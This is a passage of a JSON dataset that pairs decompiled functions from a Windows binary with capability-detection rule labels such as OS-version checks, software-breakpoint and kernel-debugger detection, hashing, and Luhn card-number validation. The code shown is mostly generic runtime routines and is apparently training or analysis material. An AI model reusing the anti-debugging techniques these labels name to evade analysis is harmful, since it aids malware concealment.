        "decompiled_code": "\nulong fcn.1400195f0(int64_t arg1, ulong arg2, ulong arg3, uint64_t arg4)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    ulong uVar4;\n    uint64_t arg1_00;\n    uint8_t *puVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    ulong auStackX24 [2];\n    ulong uStack48;\n    \n    puVar5 = ~arg4 + *(arg1 + 0x18);\n    auStackX24[0] = arg3;\n    do {\n        uVar7 = 0;\n        uVar3 = 0;\n        do {\n            uVar1 = *puVar5;\n            puVar5 = puVar5 + 1;\n            uVar2 = uVar3 & 0x3f;\n            uVar3 = uVar3 + 7;\n            uVar7 = uVar7 | (uVar1 & 0x7f) << uVar2;\n        } while (uVar1 < '\\0');\n        if (uVar7 == 0) {\n            return 0;\n        }\n        uVar3 = *(arg1 + 0x28);\n        arg1_00 = uVar3;\n        if (uVar3 == 0xff) {\n            iVar6 = 0;\n        }\n        else {\n            uVar3 = uVar3 & 7;\n            if (uVar3 == 2) {\ncode_r0x0001400196d0:\n                iVar6 = uVar7 * -2;\n            }\n            else {\n                if (uVar3 < 3) {\n                    if (uVar3 != 0) {\ncode_r0x0001400196c4:\n                        sub.msvcrt.dll_abort();\n                        goto code_r0x0001400196d0;\n                    }\n                }\n                else {\n                    iVar6 = uVar7 * -4;\n                    if (uVar3 == 3) goto code_r0x000140019674;\n                    if (uVar3 != 4) goto code_r0x0001400196c4;\n                }\n                iVar6 = uVar7 * -8;\n            }\n        }\ncode_r0x000140019674:\n        fcn.1400197b0(arg1_00, *(arg1 + 0x10), iVar6 + *(arg1 + 0x18), &uStack48);\n        uVar4 = fcn.1400194a0(uStack48, arg2, auStackX24);\n        if (uVar4 != '\\0') {\n            return uVar4;\n        }\n    } while( true );\n}\n",
        "token_count": 594
    },
    "14007bbc": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t fcn.14007bbc0(int16_t **arg1, uint16_t **arg2, ulong arg3, ulong arg4)\n\n{\n    int16_t *piVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uint16_t uVar4;\n    uint16_t uVar5;\n    uint32_t uVar6;\n    uint64_t uVar7;\n    uint16_t uVar8;\n    int16_t *piVar9;\n    int32_t in_stack_00000028;\n    \n    piVar1 = arg1[1];\n    piVar9 = *arg1;\n    if (((((arg4 & 4) != 0) && (2 < piVar1 - piVar9)) && (*piVar9 == -0x4411)) && (*(piVar9 + 1) == -0x41)) {\n        piVar9 = piVar9 + 3;\n        *arg1 = piVar9;\n    }\n    if (piVar9 != piVar1) {\n        puVar2 = arg2[1];\n        do {\n            while( true ) {\n                puVar3 = *arg2;\n                if (puVar3 == puVar2) {\n                    return 0;\n                }\n                uVar7 = fcn.14007b660(arg1, arg3);\n                uVar6 = uVar7;\n                if (uVar6 == 0xfffffffe) {\n                    return in_stack_00000028 + 1;\n                }\n                if (arg3 < uVar6) {\n                    return 2;\n                }\n                uVar4 = uVar7;\n                if (uVar6 < 0x10000) break;\n                if (puVar2 - puVar3 < 3) {\n                    *arg1 = piVar9;\n                    arg1[1] = piVar1;\n                    return 1;\n                }\n                uVar5 = (uVar4 & 0x3ff) + 0xdc00;\n                uVar8 = ((uVar7 & 0xffffffff) >> 10) + 0xd7c0;\n                if ((arg4 & 1) == 0) {\n                    uVar8 = uVar8 * 0x100 | uVar8 >> 8;\n                    uVar5 = (uVar4 & 0x3ff) << 8 | uVar5 >> 8;\n                }\n                piVar9 = *arg1;\n                *puVar3 = uVar8;\n                *arg2 = puVar3 + 2;\n                puVar3[1] = uVar5;\n                if (piVar9 == piVar1) {\n                    return 0;\n                }\n            }\n            piVar9 = *arg1;\n            if ((arg4 & 1) == 0) {\n                uVar4 = uVar4 << 8 | uVar4 >> 8;\n            }\n            *arg2 = puVar3 + 1;\n            *puVar3 = uVar4;\n        } while (piVar9 != piVar1);\n    }\n    return 0;\n}\n",
        "token_count": 677
    },
    "14007bd4": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint16_t * fcn.14007bd40(int16_t *arg1, int64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int16_t **arg1_00;\n    int64_t iVar3;\n    bool bVar4;\n    uint8_t in_stack_00000028;\n    int16_t *piStack40;\n    int64_t iStack32;\n    \n    piStack40 = arg1;\n    if (((((in_stack_00000028 & 4) != 0) && (2 < arg2 - arg1)) && (*arg1 == -0x4411)) && (*(arg1 + 1) == -0x41)) {\n        piStack40 = arg1 + 3;\n    }\n    iVar3 = arg3 + -1;\n    uVar1 = 0xffff;\n    if (arg4 < 0x10000) {\n        uVar1 = arg4;\n    }\n    if (arg3 != 0) {\n        arg1_00 = &piStack40;\n        iStack32 = arg2;\n        do {\n            uVar2 = fcn.14007b660(arg1_00, uVar1);\n            bVar4 = iVar3 != 0;\n            iVar3 = iVar3 + -1;\n        } while (uVar2 <= uVar1 && bVar4);\n    }\n    return piStack40;\n}\n",
        "token_count": 320
    },
    "1400ad0d": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.1400ad0d0(void)\n\n{\n    int32_t iVar1;\n    \n    if (**0x140102a70 == 0) {\n        iVar1 = **0x140102f50;\n        **0x140102f50 = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        iVar1 = **0x140102f50;\n        **0x140102f50 = **0x140102f50 + -1;\n    }\n    if (iVar1 != 2) {\n        return;\n    }\n    fcn.1400738e0(*0x140103070);\n    fcn.1400738e0(*0x140103050);\n    fcn.1400738e0(*0x140103060);\n    fcn.14008dca0(*0x1401030b0);\n    fcn.14008dca0(*0x140103090);\n    fcn.14008dca0(*0x1401030a0);\n    return;\n}\n",
        "token_count": 224
    },
    "1400b173": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint64_t fcn.1400b1730(int64_t *arg1, int64_t *arg2, uchar *arg3)\n\n{\n    int16_t *piVar1;\n    int16_t *piVar2;\n    int16_t iVar3;\n    int64_t iVar4;\n    int16_t *piVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    \n    piVar1 = arg1[2];\n    *arg3 = 1;\n    if (piVar1 < arg1[3]) {\n        iVar3 = *piVar1;\n    }\n    else {\n        iVar3 = (**(*arg1 + 0x48))();\n    }\n    iVar6 = 0;\n    do {\n        while( true ) {\n            if (iVar3 == -1) {\n                return iVar6;\n            }\n            piVar1 = arg1[3];\n            piVar5 = arg1[2];\n            iVar7 = piVar1 - piVar5;\n            if (iVar7 < 3) break;\n            iVar7 = iVar7 >> 1;\n            iVar4 = (**(*arg2 + 0x60))(arg2, piVar5, iVar7);\n            iVar6 = iVar6 + iVar4;\n            arg1[2] = arg1[2] + iVar4 * 2;\n            if (iVar4 < iVar7) {\ncode_r0x0001400b17f0:\n                *arg3 = 0;\n                return iVar6;\n            }\ncode_r0x0001400b178b:\n            iVar3 = (**(*arg1 + 0x48))(arg1);\n        }\n        piVar2 = arg2[5];\n        if (piVar2 < arg2[6]) {\n            *piVar2 = iVar3;\n            arg2[5] = piVar2 + 1;\n            if (piVar5 < piVar1) goto code_r0x0001400b17d0;\ncode_r0x0001400b1830:\n            iVar3 = (**(*arg1 + 0x50))(arg1);\n        }\n        else {\n            iVar3 = (**(*arg2 + 0x68))(arg2, iVar3);\n            if (iVar3 == -1) goto code_r0x0001400b17f0;\n            piVar5 = arg1[2];\n            if (arg1[3] <= piVar5) goto code_r0x0001400b1830;\ncode_r0x0001400b17d0:\n            iVar3 = *piVar5;\n            arg1[2] = piVar5 + 1;\n        }\n        iVar6 = iVar6 + 1;\n        if (iVar3 == -1) {\n            return iVar6;\n        }\n        if (arg1[3] <= arg1[2]) goto code_r0x0001400b178b;\n        iVar3 = *arg1[2];\n    } while( true );\n}\n",
        "token_count": 643
    },
    "1400123f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.1400123f0(ulong arg1, int64_t arg2, int64_t arg3)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    int64_t iVar3;\n    uint8_t *puVar4;\n    uint8_t auStack12 [12];\n    \n    uVar1 = *(arg3 + 8);\n    *(arg3 + 0x10) = 0xffffffff;\n    if (arg1 == 0) {\n        uVar2 = 0x2b;\n        if ((uVar1 & 0x100) == 0) {\n            if ((uVar1 & 0x40) == 0) {\n                puVar4 = auStack12;\n            }\n            else {\n                puVar4 = auStack12 + 1;\n                auStack12[0] = 0x20;\n            }\n            goto code_r0x00014001242b;\n        }\n    }\n    else {\n        uVar2 = 0x2d;\n    }\n    puVar4 = auStack12 + 1;\n    auStack12[0] = uVar2;\ncode_r0x00014001242b:\n    iVar3 = 0;\n    do {\n        puVar4[iVar3] = *(arg2 + iVar3) & 0xdf | uVar1 & 0x20;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 3);\n    fcn.140012250(auStack12, (puVar4 + 3) - auStack12, arg3);\n    return;\n}\n",
        "token_count": 351
    },
    "14001463": {
        "rules": [
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t fcn.140014630(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    uint32_t *puVar8;\n    uint64_t uVar9;\n    uint32_t *puVar10;\n    uint64_t uVar11;\n    int32_t iVar12;\n    uint32_t *puVar13;\n    uint32_t *puVar14;\n    uint64_t uVar15;\n    \n    if (*(arg1 + 0x14) < *(arg2 + 0x14)) {\n        return 0;\n    }\n    iVar12 = *(arg2 + 0x14) + -1;\n    puVar8 = arg2 + 0x18;\n    puVar1 = arg1 + 0x18;\n    puVar2 = puVar8 + iVar12;\n    puVar10 = puVar1 + iVar12;\n    uVar11 = *puVar10 / (*puVar2 + 1);\n    iVar5 = uVar11;\n    if (*puVar2 + 1 <= *puVar10) {\n        uVar15 = 0;\n        uVar9 = 0;\n        puVar13 = puVar1;\n        puVar14 = puVar8;\n        do {\n            uVar3 = *puVar14;\n            puVar14 = puVar14 + 1;\n            uVar6 = uVar3 * uVar11 + uVar15;\n            uVar15 = uVar6 >> 0x20;\n            iVar7 = (*puVar13 - (uVar6 & 0xffffffff)) - uVar9;\n            *puVar13 = iVar7;\n            uVar9 = iVar7 >> 0x20 & 1;\n            puVar13 = puVar13 + 1;\n        } while (puVar14 <= puVar2);\n        if (*puVar10 == 0) {\n            while ((puVar10 = puVar10 + -1,  puVar1 < puVar10 && (*puVar10 == 0))) {\n                iVar12 = iVar12 + -1;\n            }\n            *(arg1 + 0x14) = iVar12;\n            iVar4 = fcn.140017650(arg1, arg2);\n            goto joined_r0x0001400146f3;\n        }\n    }\n    iVar4 = fcn.140017650(arg1, arg2);\njoined_r0x0001400146f3:\n    if (-1 < iVar4) {\n        uVar11 = 0;\n        puVar10 = puVar1;\n        do {\n            uVar3 = *puVar8;\n            puVar8 = puVar8 + 1;\n            iVar7 = (*puVar10 - uVar3) - uVar11;\n            *puVar10 = iVar7;\n            uVar11 = iVar7 >> 0x20 & 1;\n            puVar10 = puVar10 + 1;\n        } while (puVar8 <= puVar2);\n        puVar8 = puVar1 + iVar12;\n        if (*puVar8 == 0) {\n            while ((puVar8 = puVar8 + -1,  puVar1 < puVar8 && (*puVar8 == 0))) {\n                iVar12 = iVar12 + -1;\n            }\n            iVar5 = iVar5 + 1;\n            *(arg1 + 0x14) = iVar12;\n        }\n        else {\n            iVar5 = iVar5 + 1;\n        }\n    }\n    return iVar5;\n}\n",
        "token_count": 809
    },
    "1400176a": {
        "rules": [
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint64_t fcn.1400176a0(int64_t arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    int32_t *piVar2;\n    uint64_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t *puVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    int64_t iVar11;\n    uint32_t *puVar12;\n    uint64_t uVar13;\n    int32_t *piVar14;\n    int32_t iVar15;\n    uint32_t uVar16;\n    uint32_t *puVar17;\n    bool bVar18;\n    \n    iVar5 = *(arg2 + 0x14);\n    iVar15 = *(arg1 + 0x14) - iVar5;\n    bVar18 = iVar15 < 0;\n    iVar10 = arg2;\n    if (iVar15 == 0) {\n        puVar6 = arg1 + 0x18U + iVar5;\n        puVar12 = arg2 + 0x18 + iVar5 * 4;\n        do {\n            puVar6 = puVar6 + -1;\n            puVar12 = puVar12 + -1;\n            if (*puVar6 != *puVar12) {\n                if (*puVar6 < *puVar12) goto code_r0x000140017823;\n                goto code_r0x000140017700;\n            }\n        } while (arg1 + 0x18U < puVar6);\n        iVar7 = fcn.140016f80(0);\n        if (iVar7 != 0) {\n            *(iVar7 + 0x14) = 1;\n        }\n    }\n    else {\n        iVar15 = 0;\n        if (bVar18) {\ncode_r0x000140017823:\n            iVar15 = 1;\n            iVar10 = arg1;\n            arg1 = arg2;\n        }\ncode_r0x000140017700:\n        iVar7 = fcn.140016f80(*(arg1 + 8));\n        if (iVar7 != 0) {\n            *(iVar7 + 0x10) = iVar15;\n            uVar16 = *(arg1 + 0x14);\n            uVar8 = uVar16;\n            iVar11 = 0x18;\n            uVar13 = 0;\n            puVar6 = arg1 + 0x18 + uVar8 * 4;\n            uVar3 = iVar10 + 0x18 + *(iVar10 + 0x14) * 4;\n            do {\n                iVar9 = (*(arg1 + iVar11) - *(iVar10 + iVar11)) - uVar13;\n                iVar5 = iVar9;\n                *(iVar7 + iVar11) = iVar5;\n                iVar11 = iVar11 + 4;\n                uVar13 = iVar9 >> 0x20 & 1;\n            } while (iVar11 + iVar10 < uVar3);\n            uVar1 = (uVar3 - iVar10) - 0x19;\n            iVar11 = (uVar1 & 0xfffffffffffffffc) + 4;\n            if (uVar3 < iVar10 + 0x19U) {\n                iVar11 = 4;\n            }\n            puVar17 = arg1 + 0x18 + iVar11;\n            piVar2 = iVar7 + 0x18 + iVar11;\n            puVar12 = puVar17;\n            piVar14 = piVar2;\n            if (puVar17 < puVar6) {\n                do {\n                    uVar4 = *puVar12;\n                    puVar12 = puVar12 + 1;\n                    iVar5 = uVar4 - uVar13;\n                    *piVar14 = iVar5;\n                    uVar13 = uVar4 - uVar13 >> 0x20 & 1;\n                    piVar14 = piVar14 + 1;\n                } while (puVar12 < puVar6);\n                iVar10 = piVar2 + (puVar6 + (-1 - puVar17) & 0xfffffffffffffffcU);\n            }\n            else {\n                uVar13 = uVar1 & 0xfffffffffffffffc;\n                if (uVar3 < iVar10 + 0x19U) {\n                    uVar13 = 0;\n                }\n                iVar10 = iVar7 + 0x18 + uVar13;\n            }\n            while (iVar5 == 0) {\n                piVar2 = iVar10 + -4;\n                iVar10 = iVar10 + -4;\n                uVar16 = uVar8 - 1;\n                uVar8 = uVar16;\n                iVar5 = *piVar2;\n            }\n            *(iVar7 + 0x14) = uVar16;\n        }\n    }\n    return iVar7;\n}\n",
        "token_count": 1066
    },
    "14007ba3": {
        "rules": [
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.14007ba30(uint16_t **arg1, uint16_t **arg2, ulong arg3, ulong arg4)\n\n{\n    uint16_t *puVar1;\n    uint16_t *puVar2;\n    uint32_t uVar3;\n    uint16_t uVar4;\n    uint16_t *puVar5;\n    uint16_t *puVar6;\n    uint32_t auStackX32 [2];\n    \n    auStackX32[0] = arg4;\n    fcn.14007b340(arg1, auStackX32);\n    puVar6 = *arg1;\n    puVar1 = arg1[1];\n    if (0xffff < arg3) {\n        arg3._0_4_ = 0xffff;\n    }\n    if (puVar1 - puVar6 >> 1 != 0) {\n        puVar2 = arg2[1];\n        puVar5 = *arg2;\n        do {\n            if (puVar5 == puVar2) {\n                return 1;\n            }\n            uVar4 = *puVar6;\n            if ((auStackX32[0] & 1) == 0) {\n                uVar4 = uVar4 << 8 | uVar4 >> 8;\n            }\n            uVar3 = uVar4;\n            if (((uVar3 - 0xd800 < 0x400) || (uVar3 - 0xdc00 < 0x400)) || (arg3 < uVar3)) {\n                return 2;\n            }\n            puVar6 = puVar6 + 1;\n            *arg1 = puVar6;\n            *arg2 = puVar5 + 1;\n            *puVar5 = uVar4;\n            puVar5 = puVar5 + 1;\n        } while (puVar1 - puVar6 >> 1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 417
    },
    "14007bb2": {
        "rules": [
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nbool fcn.14007bb20(uint16_t **arg1, uint16_t **arg2, ulong arg3, ulong arg4)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    uint16_t *puVar3;\n    uint16_t *puVar4;\n    \n    puVar4 = arg1[1];\n    puVar1 = *arg1;\n    if (puVar4 != puVar1) {\n        puVar3 = *arg2;\n        do {\n            if (arg2[1] - puVar3 >> 1 == 0) {\n                return puVar1 != puVar4;\n            }\n            uVar2 = *puVar1;\n            if ((uVar2 - 0xd800 < 0x400) || (arg3 < uVar2)) {\n                return 2;\n            }\n            if ((arg4 & 1) == 0) {\n                uVar2 = uVar2 << 8 | uVar2 >> 8;\n            }\n            *puVar3 = uVar2;\n            puVar4 = arg1[1];\n            puVar3 = *arg2 + 1;\n            puVar1 = *arg1;\n            *arg2 = puVar3;\n            puVar1 = puVar1 + 1;\n            *arg1 = puVar1;\n        } while (puVar1 != puVar4);\n    }\n    return false;\n}\n",
        "token_count": 312
    },
    "14009858": {
        "rules": [
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.140098580(uint16_t *arg1, int64_t arg2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    uint32_t uVar7;\n    uint16_t uVar8;\n    uint64_t uVar9;\n    uint32_t uVar10;\n    bool bVar11;\n    \n    uVar8 = *arg1;\n    if ((uVar8 & 0x101) == 0x101) {\n        *(arg2 + 8) = *(arg2 + 8) + 0xc;\n    }\n    uVar1 = *arg1;\n    uVar9 = uVar1;\n    if (uVar1 < '\\0') {\n        iVar2 = 0;\n        if ((*(arg1 + 1) & 2) != 0) {\n            iVar2 = *(arg2 + 0x14) % 100;\n        }\n        *(arg2 + 0x14) = (*(arg1 + 2) + -0x13) * 100 + iVar2;\n    }\n    if ((uVar8 & 0x402) == 0x400) {\n        if (((uVar1 & 0x18) == 0x18) || ((uVar1 & 4) == 0)) {\n            uVar5 = *(arg2 + 0x10);\n            if ((uVar1 & 8) == 0) goto code_r0x00014009895d;\n        }\n        else {\n            uVar3 = *(arg2 + 0x14) + 0x76c;\n            uVar10 = uVar3 % 100;\n            bVar11 = (uVar3 & 3) == 0;\n            iVar2 = 0;\n            while( true ) {\n                if ((uVar10 != 0) || (iVar6 = 0,  uVar3 % 400 == 0)) {\n                    iVar6 = bVar11;\n                }\n                if (*(arg2 + 0x1c) < *((iVar6 * 0xd + iVar2) * 2 + 0x1401039a0)) break;\n                iVar2 = iVar2 + 1;\n            }\n            if ((uVar1 & 8) == 0) {\n                uVar7 = iVar2 - 1;\n                *(arg2 + 0x10) = uVar7;\n            }\n            else {\n                uVar7 = *(arg2 + 0x10);\n            }\n            uVar5 = uVar7;\n            if ((uVar1 & 0x10) == 0) {\n                if ((uVar10 != 0) || (uVar3 % 400 == 0)) {\n                    uVar10 = bVar11;\n                }\n                *(arg2 + 0xc) = (*(arg2 + 0x1c) - *((uVar10 * 0xd + iVar2 + -1) * 2 + 0x1401039a0)) + 1;\n            }\n            uVar3 = *arg1 | 0x18;\n            uVar9 = uVar3;\n            *arg1 = uVar3;\n            uVar8 = *arg1;\n            if ((uVar3 & 8) == 0) {\ncode_r0x00014009895d:\n                if (0xb < uVar5) goto code_r0x0001400985d1;\n            }\n        }\n        uVar4 = fcn.14007b390(*(arg2 + 0x14), uVar5);\n        *(arg2 + 0x18) = uVar4;\n    }\n    if ((uVar8 & 0x404) == 0x400) {\n        if (((uVar9 & 8) != 0) || (*(arg2 + 0x10) < 0xc)) {\n            uVar3 = *(arg2 + 0x14) + 0x76c;\n            uVar10 = uVar3 % 100;\n            if ((uVar10 != 0) || ((uVar3 * -0x3d70a3d7 + 0x51eb850 >> 4 | uVar3 * -0x70000000) < 0xa3d70b)) {\n                uVar10 = (uVar3 & 3) == 0;\n            }\n            *(arg2 + 0x1c) = *(arg2 + 0xc) + -1 + *((uVar10 * 0xd + *(arg2 + 0x10)) * 2 + 0x1401039a0);\n        }\n    }\ncode_r0x0001400985d1:\n    if (((uVar9 & 0x60) != 0) && ((uVar9 & 2) != 0)) {\n        uVar3 = *(arg2 + 0x14);\n        if ((uVar9 & 4) == 0) {\n            iVar2 = fcn.14007b390(uVar3, 0);\n            uVar10 = (uVar9 >> 5 ^ 1) & 1;\n            *(arg2 + 0x1c) =\n                 ((uVar10 - iVar2) + 7) % 7 + ((*(arg1 + 1) & 0x3f) - 1) * 7 + ((*(arg2 + 0x18) - uVar10) + 7) % 7;\n        }\n        if ((uVar9 & 0x18) != 0x18) {\n            uVar3 = uVar3 + 0x76c;\n            iVar2 = 0;\n            uVar10 = uVar3 % 100;\n            while( true ) {\n                if ((uVar10 != 0) || (uVar5 = 0,  uVar3 % 400 == 0)) {\n                    uVar5 = (uVar3 & 3) == 0;\n                }\n                if (*(arg2 + 0x1c) < *((uVar5 * 0xd + iVar2) * 2 + 0x1401039a0)) break;\n                iVar2 = iVar2 + 1;\n            }\n            if ((uVar9 & 8) == 0) {\n                *(arg2 + 0x10) = iVar2 + -1;\n            }\n            if ((uVar9 & 0x10) == 0) {\n                if ((uVar10 != 0) || (uVar3 % 400 == 0)) {\n                    uVar10 = (uVar3 & 3) == 0;\n                }\n                *(arg2 + 0xc) = (*(arg2 + 0x1c) - *((uVar10 * 0xd + iVar2 + -1) * 2 + 0x1401039a0)) + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1543
    },
    "140073e2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nchar * fcn.140073e20(uchar *arg1, char **arg2)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    char *pcVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint64_t arg2_00;\n    ulong in_R8;\n    uchar auStack88 [24];\n    \n    pcVar3 = *arg2;\n    *(arg1 + 8) = arg2;\n    *arg1 = 0;\n    iVar2 = *(pcVar3 + -0x18) + arg2;\n    pcVar3 = *(iVar2 + 0xd8);\n    uVar4 = *(iVar2 + 0x20);\n    if (pcVar3 != NULL) {\n        if (uVar4 != 0) goto code_r0x000140073e50;\n        fcn.1400738e0(pcVar3);\n        pcVar3 = *arg2;\n        iVar2 = arg2 + *(pcVar3 + -0x18);\n    }\n    uVar4 = *(iVar2 + 0x20);\n    if (uVar4 == 0) {\n        *arg1 = 1;\n        return pcVar3;\n    }\ncode_r0x000140073e50:\n    if ((uVar4 & 1) == 0) {\n        return pcVar3;\n    }\n    uVar5 = uVar4 | 4;\n    if (*(iVar2 + 0xe8) == 0) {\n        uVar5 = uVar4 | 5;\n    }\n    *(iVar2 + 0x20) = uVar5;\n    uVar5 = uVar5 & *(iVar2 + 0x1c);\n    arg2_00 = uVar5;\n    if (uVar5 == 0) {\n        return pcVar3;\n    }\n    pcVar3 = \"basic_ios::clear\";\n    fcn.1400b76e0(\"basic_ios::clear\");\n    fcn.14009fa10(pcVar3, arg2_00 + 0xd0);\n    fcn.1400ad170(auStack88, arg2_00, in_R8);\n    fcn.14009fb20(auStack88);\n    fcn.1400ae6e0(arg2_00, in_R8);\n    piVar1 = *(arg2_00 + 0xe8);\n    if (piVar1 != NULL) {\n        fcn.14009fa10(auStack88, piVar1 + 7);\n        (**(*piVar1 + 0x10))(piVar1, in_R8);\n        fcn.14009fb80(piVar1 + 7, in_R8);\n        fcn.14009fb20(auStack88);\n    }\n    return pcVar3;\n}\n",
        "token_count": 621
    },
    "14008e1e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nchar * fcn.14008e1e0(uchar *arg1, char **arg2)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    char *pcVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint64_t arg2_00;\n    ulong in_R8;\n    uchar auStack88 [24];\n    \n    pcVar3 = *arg2;\n    *(arg1 + 8) = arg2;\n    *arg1 = 0;\n    iVar2 = *(pcVar3 + -0x18) + arg2;\n    pcVar3 = *(iVar2 + 0xd8);\n    uVar4 = *(iVar2 + 0x20);\n    if (pcVar3 != NULL) {\n        if (uVar4 != 0) goto code_r0x00014008e210;\n        fcn.14008dca0(pcVar3);\n        pcVar3 = *arg2;\n        iVar2 = arg2 + *(pcVar3 + -0x18);\n    }\n    uVar4 = *(iVar2 + 0x20);\n    if (uVar4 == 0) {\n        *arg1 = 1;\n        return pcVar3;\n    }\ncode_r0x00014008e210:\n    if ((uVar4 & 1) == 0) {\n        return pcVar3;\n    }\n    uVar5 = uVar4 | 4;\n    if (*(iVar2 + 0xe8) == 0) {\n        uVar5 = uVar4 | 5;\n    }\n    *(iVar2 + 0x20) = uVar5;\n    uVar5 = uVar5 & *(iVar2 + 0x1c);\n    arg2_00 = uVar5;\n    if (uVar5 == 0) {\n        return pcVar3;\n    }\n    pcVar3 = \"basic_ios::clear\";\n    fcn.1400b76e0(\"basic_ios::clear\");\n    fcn.14009fa10(pcVar3, arg2_00 + 0xd0);\n    fcn.1400ad170(auStack88, arg2_00, in_R8);\n    fcn.14009fb20(auStack88);\n    fcn.1400af0e0(arg2_00, in_R8);\n    piVar1 = *(arg2_00 + 0xe8);\n    if (piVar1 != NULL) {\n        fcn.14009fa10(auStack88, piVar1 + 7);\n        (**(*piVar1 + 0x10))(piVar1, in_R8);\n        fcn.14009fb80(piVar1 + 7, in_R8);\n        fcn.14009fb20(auStack88);\n    }\n    return pcVar3;\n}\n",
        "token_count": 623
    },
    "1400b682": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b6820(void)\n\n{\n    int64_t **ppiVar1;\n    int64_t *piVar2;\n    \n    ppiVar1 = fcn.1400b6970();\n    piVar2 = *ppiVar1;\n    if (piVar2 != NULL) {\n        if ((*(piVar2 + 10) & 1) != 0) {\n            piVar2 = *piVar2 + -0x90;\n        }\n        piVar2 = *piVar2;\n    }\n    return piVar2;\n}\n",
        "token_count": 126
    },
    "1400019a": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.1400019a9(ulong arg1)\n\n{\n    int32_t iVar1;\n    ulong var_10h;\n    ulong var_4h;\n    \n    iVar1 = fcn.1400015ee();\n    if (iVar1 != 0) {\n        for (var_4h._0_4_ = 0; var_4h < *0x1400b8020; var_4h._0_4_ = var_4h + 1) {\n            if (arg1 == *(var_4h * 8 + 0x1400b8024)) {\n                return var_4h;\n            }\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 182
    },
    "1400048a": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
